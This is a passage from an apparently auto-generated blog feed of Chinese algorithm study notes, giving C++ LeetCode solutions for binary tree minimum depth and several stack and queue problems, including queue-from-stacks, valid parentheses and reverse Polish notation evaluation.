id="二叉树的最小深度">二叉树的最小深度</h1><p><ahref="https://leetcode.cn/problems/minimum-depth-of-binary-tree/">111.二叉树的最小深度 - 力扣（LeetCode）</a></p><p><strong>最小深度是从根节点到最近叶子节点的最短路径上的节点数量。</strong></p><h2 id="递归法-3">递归法</h2><ul><li><p>确定递归函数的参数和返回值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getDepth</span><span class="hljs-params">(TreeNode* node)</span></span><br></code></pre></td></tr></table></figure></li><li><p>确定终止条件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (node == <span class="hljs-literal">nullptr</span>)  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure></li><li><p>确定单层递归的逻辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> leftDepth = <span class="hljs-built_in">getDepth</span>(node-&gt;left);           <span class="hljs-comment">// 左</span><br><span class="hljs-type">int</span> rightDepth = <span class="hljs-built_in">getDepth</span>(node-&gt;right);         <span class="hljs-comment">// 右</span><br>                                                <span class="hljs-comment">// 中</span><br><span class="hljs-comment">// 当一个左子树为空，右不为空，这时并不是最低点</span><br><span class="hljs-keyword">if</span> (node-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; node-&gt;right != <span class="hljs-literal">NULL</span>) &#123; <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> + rightDepth;<br>&#125;   <br><span class="hljs-comment">// 当一个右子树为空，左不为空，这时并不是最低点</span><br><span class="hljs-keyword">if</span> (node-&gt;left != <span class="hljs-literal">NULL</span> &amp;&amp; node-&gt;right == <span class="hljs-literal">NULL</span>) &#123; <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> + leftDepth;<br>&#125;<br><span class="hljs-type">int</span> result = <span class="hljs-number">1</span> + <span class="hljs-built_in">min</span>(leftDepth, rightDepth);<br><span class="hljs-keyword">return</span> result;<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getDepth</span><span class="hljs-params">(TreeNode* node)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> leftDepth = <span class="hljs-built_in">getDepth</span>(node-&gt;left);           <span class="hljs-comment">// 左</span><br>        <span class="hljs-type">int</span> rightDepth = <span class="hljs-built_in">getDepth</span>(node-&gt;right);         <span class="hljs-comment">// 右</span><br>                                                        <span class="hljs-comment">// 中</span><br>        <span class="hljs-comment">// 当一个左子树为空，右不为空，这时并不是最低点</span><br>        <span class="hljs-keyword">if</span> (node-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; node-&gt;right != <span class="hljs-literal">NULL</span>) &#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> + rightDepth;<br>        &#125;   <br>        <span class="hljs-comment">// 当一个右子树为空，左不为空，这时并不是最低点</span><br>        <span class="hljs-keyword">if</span> (node-&gt;left != <span class="hljs-literal">NULL</span> &amp;&amp; node-&gt;right == <span class="hljs-literal">NULL</span>) &#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> + leftDepth;<br>        &#125;<br>        <span class="hljs-type">int</span> result = <span class="hljs-number">1</span> + <span class="hljs-built_in">min</span>(leftDepth, rightDepth);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">minDepth</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getDepth</span>(root);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="迭代法-3">迭代法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">minDepth</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> depth = <span class="hljs-number">0</span>;<br>        queue&lt;TreeNode*&gt; que;<br>        que.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-keyword">while</span>(!que.<span class="hljs-built_in">empty</span>()) &#123;<br>            <span class="hljs-type">int</span> size = que.<span class="hljs-built_in">size</span>();<br>            depth++; <span class="hljs-comment">// 记录最小深度</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) &#123;<br>                TreeNode* node = que.<span class="hljs-built_in">front</span>();<br>                que.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">if</span> (node-&gt;left) que.<span class="hljs-built_in">push</span>(node-&gt;left);<br>                <span class="hljs-keyword">if</span> (node-&gt;right) que.<span class="hljs-built_in">push</span>(node-&gt;right);<br>                <span class="hljs-keyword">if</span> (!node-&gt;left &amp;&amp; !node-&gt;right) &#123; <span class="hljs-comment">// 当左右孩子都为空的时候，说明是最低点的一层了，退出</span><br>                    <span class="hljs-keyword">return</span> depth;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> depth;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
      <tag>二叉树</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈与队列</title>
    <link href="/2022/09/28/Algorithm/algorithm-5/"/>
    <url>/2022/09/28/Algorithm/algorithm-5/</url>
    
    <content type="html"><![CDATA[<p>本文为学习<ahref="https://programmercarl.com/">代码随想录</a>时所做的笔记，仅供学习参考，不做任何商业用途，若有侵权，请联系删除。</p><h1 id="栈与队列理论基础">栈与队列理论基础</h1><p>C++标准库是有多个版本的，要知道我们使用的STL是哪个版本，才能知道对应的栈和队列的实现原理。</p><ol type="1"><li>HP STL 其他版本的C++ STL，一般是以HP STL为蓝本实现出来的，HPSTL是C++ STL的第一个实现版本，而且开放源代码。</li><li>P.J.Plauger STL 由P.J.Plauger参照HP STL实现出来的，被VisualC++编译器所采用，不是开源的。</li><li>SGI STL 由Silicon Graphics Computer Systems公司参照HPSTL实现，被Linux的C++编译器GCC所采用，SGISTL是开源软件，源码可读性甚高。</li></ol><span id="more"></span><p><strong>栈是以底层容器完成其所有的工作，对外提供统一的接口，底层容器是可插拔的（也就是说我们可以控制使用哪种容器来实现栈的功能）。</strong></p><p>所以STL中栈往往不被归类为容器，而被归类为containeradapter（容器适配器）。</p><p>从下图中可以看出，栈的内部结构，栈的底层实现可以是vector，deque，list都是可以的， 主要就是数组和链表的底层实现。</p><p><strong>我们常用的SGISTL，如果没有指定底层实现的话，默认是以deque为缺省情况下栈的低层结构。</strong></p><p>deque是一个双向队列，只要封住一段，只开通另一端就可以实现栈的逻辑了。</p><p><strong>SGI STL中队列底层实现缺省情况下一样使用deque实现的。</strong></p><p>我们也可以指定vector为栈的底层实现，初始化语句如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">std::stack&lt;<span class="hljs-type">int</span>, std::vector&lt;<span class="hljs-type">int</span>&gt; &gt; third;  <span class="hljs-comment">// 使用vector为底层容器的栈</span><br></code></pre></td></tr></table></figure><p>刚刚讲过栈的特性，对应的队列的情况是一样的。</p><p>队列中先进先出的数据结构，同样不允许有遍历行为，不提供迭代器,<strong>SGI STL中队列一样是以deque为缺省情况下的底部结构。</strong></p><p>也可以指定list 为起底层实现，初始化queue的语句如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">std::queue&lt;<span class="hljs-type">int</span>, std::list&lt;<span class="hljs-type">int</span>&gt;&gt; third; <span class="hljs-comment">// 定义以list为底层容器的队列</span><br></code></pre></td></tr></table></figure><p>所以STL 队列也不被归类为容器，而被归类为container adapter（容器适配器）。</p><h1 id="用栈实现队列">用栈实现队列</h1><p><ahref="https://leetcode.cn/problems/implement-queue-using-stacks/">232.用栈实现队列 - 力扣（LeetCode）</a></p><p>在push数据的时候，只要数据放进输入栈就好，<strong>但在pop的时候，操作就复杂一些，输出栈如果为空，就把进栈数据全部导入进来（注意是全部导入）</strong>，再从出栈弹出数据，如果输出栈不为空，则直接从出栈弹出数据就可以了。</p><p>最后如何判断队列为空呢？<strong>如果进栈和出栈都为空的话，说明模拟的队列为空了。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyQueue</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    stack&lt;<span class="hljs-type">int</span>&gt; stIn;<br>    stack&lt;<span class="hljs-type">int</span>&gt; stOut;<br>    <span class="hljs-comment">/** Initialize your data structure here. */</span><br>    <span class="hljs-built_in">MyQueue</span>() &#123;<br><br>    &#125;<br>    <span class="hljs-comment">/** Push element x to the back of queue. */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>        stIn.<span class="hljs-built_in">push</span>(x);<br>    &#125;<br><br>    <span class="hljs-comment">/** Removes the element from in front of queue and returns that element. */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-comment">// 只有当stOut为空的时候，再从stIn里导入数据（导入stIn全部数据）</span><br>        <span class="hljs-keyword">if</span> (stOut.<span class="hljs-built_in">empty</span>()) &#123;<br>            <span class="hljs-comment">// 从stIn导入数据直到stIn为空</span><br>            <span class="hljs-keyword">while</span>(!stIn.<span class="hljs-built_in">empty</span>()) &#123;<br>                stOut.<span class="hljs-built_in">push</span>(stIn.<span class="hljs-built_in">top</span>());<br>                stIn.<span class="hljs-built_in">pop</span>();<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">int</span> result = stOut.<span class="hljs-built_in">top</span>();<br>        stOut.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-comment">/** Get the front element. */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">peek</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-type">int</span> res = <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// 直接使用已有的pop函数</span><br>        stOut.<span class="hljs-built_in">push</span>(res); <span class="hljs-comment">// 因为pop函数弹出了元素res，所以再添加回去</span><br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br><br>    <span class="hljs-comment">/** Returns whether the queue is empty. */</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">empty</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> stIn.<span class="hljs-built_in">empty</span>() &amp;&amp; stOut.<span class="hljs-built_in">empty</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>定要懂得复用，功能相近的函数要抽象出来，不要大量的复制粘贴，很容易出问题！</strong></p><h1 id="用队列实现栈">用队列实现栈</h1><p><ahref="https://leetcode.cn/problems/implement-stack-using-queues/">225.用队列实现栈 - 力扣（LeetCode）</a></p><p><strong>一个队列在模拟栈弹出元素的时候只要将队列头部的元素（除了最后一个元素外）重新添加到队列尾部，此时在去弹出元素就是栈的顺序了。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyStack</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    queue&lt;<span class="hljs-type">int</span>&gt; que;<br>    <span class="hljs-comment">/** Initialize your data structure here. */</span><br>    <span class="hljs-built_in">MyStack</span>() &#123;<br><br>    &#125;<br>    <span class="hljs-comment">/** Push element x onto stack. */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>        que.<span class="hljs-built_in">push</span>(x);<br>    &#125;<br>    <span class="hljs-comment">/** Removes the element on top of the stack and returns that element. */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-type">int</span> size = que.<span class="hljs-built_in">size</span>();<br>        size--;<br>        <span class="hljs-keyword">while</span> (size--) &#123; <span class="hljs-comment">// 将队列头部的元素（除了最后一个元素外） 重新添加到队列尾部</span><br>            que.<span class="hljs-built_in">push</span>(que.<span class="hljs-built_in">front</span>());<br>            que.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-type">int</span> result = que.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">// 此时弹出的元素顺序就是栈的顺序了</span><br>        que.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-comment">/** Get the top element. */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">top</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> que.<span class="hljs-built_in">back</span>();<br>    &#125;<br><br>    <span class="hljs-comment">/** Returns whether the stack is empty. */</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">empty</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> que.<span class="hljs-built_in">empty</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="有效的括号">有效的括号</h1><p><a href="https://leetcode.cn/problems/valid-parentheses/">20.有效的括号 - 力扣（LeetCode）</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isValid</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (s.<span class="hljs-built_in">size</span>() % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 如果s的长度为奇数，一定不符合要求</span><br>        stack&lt;<span class="hljs-type">char</span>&gt; st;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (s[i] == <span class="hljs-string">&#x27;(&#x27;</span>) st.<span class="hljs-built_in">push</span>(<span class="hljs-string">&#x27;)&#x27;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (s[i] == <span class="hljs-string">&#x27;&#123;&#x27;</span>) st.<span class="hljs-built_in">push</span>(<span class="hljs-string">&#x27;&#125;&#x27;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (s[i] == <span class="hljs-string">&#x27;[&#x27;</span>) st.<span class="hljs-built_in">push</span>(<span class="hljs-string">&#x27;]&#x27;</span>);<br>            <span class="hljs-comment">// 第三种情况：遍历字符串匹配的过程中，栈已经为空了，没有匹配的字符了，说明右括号没有找到对应的左括号 return false</span><br>            <span class="hljs-comment">// 第二种情况：遍历字符串匹配的过程中，发现栈里没有我们要匹配的字符。所以return false</span><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (st.<span class="hljs-built_in">empty</span>() || st.<span class="hljs-built_in">top</span>() != s[i]) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">else</span> st.<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// st.top() 与 s[i]相等，栈弹出元素</span><br>        &#125;<br>        <span class="hljs-comment">// 第一种情况：此时我们已经遍历完了字符串，但是栈不为空，说明有相应的左括号没有右括号来匹配，所以return false，否则就return true</span><br>        <span class="hljs-keyword">return</span> st.<span class="hljs-built_in">empty</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="删除字符串中的所有相邻重复项">删除字符串中的所有相邻重复项</h1><p><ahref="https://leetcode.cn/problems/remove-all-adjacent-duplicates-in-string/">1047.删除字符串中的所有相邻重复项 - 力扣（LeetCode）</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">removeDuplicates</span><span class="hljs-params">(string S)</span> </span>&#123;<br>        stack&lt;<span class="hljs-type">char</span>&gt; st;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> s : S) &#123;<br>            <span class="hljs-keyword">if</span> (st.<span class="hljs-built_in">empty</span>() || s != st.<span class="hljs-built_in">top</span>()) &#123;<br>                st.<span class="hljs-built_in">push</span>(s);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                st.<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// s 与 st.top()相等的情况</span><br>            &#125;<br>        &#125;<br>        string result = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">while</span> (!st.<span class="hljs-built_in">empty</span>()) &#123; <span class="hljs-comment">// 将栈中元素放到result字符串汇总</span><br>            result += st.<span class="hljs-built_in">top</span>();<br>            st.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-built_in">reverse</span> (result.<span class="hljs-built_in">begin</span>(), result.<span class="hljs-built_in">end</span>()); <span class="hljs-comment">// 此时字符串需要反转一下</span><br>        <span class="hljs-keyword">return</span> result;<br><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">removeDuplicates</span><span class="hljs-params">(string S)</span> </span>&#123;<br>        string result;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">char</span> s : S) &#123;<br>            <span class="hljs-keyword">if</span>(result.<span class="hljs-built_in">empty</span>() || result.<span class="hljs-built_in">back</span>() != s) &#123;<br>                result.<span class="hljs-built_in">push_back</span>(s);<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                result.<span class="hljs-built_in">pop_back</span>();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>递归的实现就是：每一次递归调用都会把函数的局部变量、参数值和返回地址等压入调用栈中</strong>，然后递归返回的时候，从栈顶弹出上一次递归的各项参数，所以这就是递归为什么可以返回上一层位置的原因。</p><p>而且<strong>在企业项目开发中，尽量不要使用递归</strong>！在项目比较大的时候，由于参数多，全局变量等等，使用递归很容易判断不充分return的条件，非常容易无限递归（或者递归层级过深），<strong>造成栈溢出错误（这种问题还不好排查！）</strong></p><h1 id="逆波兰表达式求值">逆波兰表达式求值</h1><p><ahref="https://leetcode.cn/problems/evaluate-reverse-polish-notation/">150.逆波兰表达式求值 - 力扣（LeetCode）</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">evalRPN</span><span class="hljs-params">(vector&lt;string&gt;&amp; tokens)</span> </span>&#123;<br>        stack&lt;<span class="hljs-type">int</span>&gt; st;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; tokens.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (tokens[i] == <span class="hljs-string">&quot;+&quot;</span> || tokens[i] == <span class="hljs-string">&quot;-&quot;</span> || tokens[i] == <span class="hljs-string">&quot;*&quot;</span> || tokens[i] == <span class="hljs-string">&quot;/&quot;</span>) &#123;<br>                <span class="hljs-type">int</span> num1 = st.<span class="hljs-built_in">top</span>();<br>                st.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-type">int</span> num2 = st.<span class="hljs-built_in">top</span>();<br>                st.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">if</span> (tokens[i] == <span class="hljs-string">&quot;+&quot;</span>) st.<span class="hljs-built_in">push</span>(num2 + num1);<br>                <span class="hljs-keyword">if</span> (tokens[i] == <span class="hljs-string">&quot;-&quot;</span>) st.<span class="hljs-built_in">push</span>(num2 - num1);<br>                <span class="hljs-keyword">if</span> (tokens[i] == <span class="hljs-string">&quot;*&quot;</span>) st.<span class="hljs-built_in">push</span>(num2 * num1);<br>                <span class="hljs-keyword">if</span> (tokens[i] == <span class="hljs-string">&quot;/&quot;</span>) st.<span class="hljs-built_in">push</span>(num2 / num1);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                st.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">stoi</span>(tokens[i]));<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">int</span> result = st.<span class="hljs-built_in">top</span>();<br>        st.<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// 把栈里最后一个元素弹出（其实不弹出也没事）</span><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="滑动窗口最大值">滑动窗口最大值</h1><p><a href="https://leetcode.cn/problems/sliding-window-maximum/">239.滑动窗口最大值 - 力扣（LeetCode）</a></p><h2 id="思路">思路</h2><p>此时我们需要一个队列，这个队列呢，放进去窗口里的元素，然后随着窗口的移动，队列也一进一出，每次移动之后，队列告诉我们里面的最大值是什么。</p><p>这个队列应该长这个样子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyQueue</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">(<span class="hljs-type">int</span> value)</span> </span>&#123;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> value)</span> </span>&#123;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">front</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> que.<span class="hljs-built_in">front</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>每次窗口移动的时候，调用que.pop(滑动窗口中移除元素的数值)，que.push(滑动窗口添加元素的数值)，然后que.front()就返回我们要的最大值。</p><p><strong>其实队列没有必要维护窗口里的所有元素，只需要维护有可能成为窗口里最大值的元素就可以了，同时保证队里里的元素数值是由大到小的。</strong></p><p>那么这个维护元素单调递减的队列就叫做<strong>单调队列，即单调递减或单调递增的队列。C++中没有直接支持单调队列，需要我们自己来一个单调队列</strong></p><p><strong>不要以为实现的单调队列就是对窗口里面的数进行排序，如果排序的话，那和优先级队列又有什么区别了呢。</strong></p><p>对于窗口里的元素{2, 3, 5, 1 ,4}，单调队列里只维护{5, 4}就够了，保持单调队列里单调递减，此时队列出口元素就是窗口里最大元素。</p><p>此时大家应该怀疑单调队列里维护着{5, 4} 怎么配合窗口经行滑动呢？</p><p>设计单调队列的时候，pop，和push操作要保持如下规则：</p><ol 